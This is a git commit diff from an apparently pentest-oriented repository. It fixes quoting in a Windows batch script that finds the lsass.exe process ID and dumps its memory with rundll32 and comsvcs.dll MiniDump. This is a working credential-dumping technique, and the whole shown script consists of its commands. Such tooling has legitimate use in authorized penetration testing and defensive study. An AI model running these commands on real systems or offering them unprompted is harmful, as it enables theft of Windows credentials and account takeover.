4171dfdc7cb776101ec70f1e8e6f61f8e446b8bc
PentestPlaybook <123711693+PentestPlaybook@users.noreply.github.com>
2026-06-12 20:28:40 -0700

    Fix syntax for OUTFILE variable in batch script

--- lsass_comsvcs.bat
+++ lsass_comsvcs.bat
@@ -14,6 +14,6 @@ set OUTFILE=%~dp0lsass_comsvcs.dmp
 :run
 for /f "tokens=2" %%i in ('C:\Windows\System32\tasklist.exe /fi "imagename eq lsass.exe" /nh') do set PID=%%i
 echo LSASS PID: %PID%
-C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %PID% "!OUTFILE!" full
+C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %PID% !OUTFILE! full
 echo Done.
 dir "!OUTFILE!"
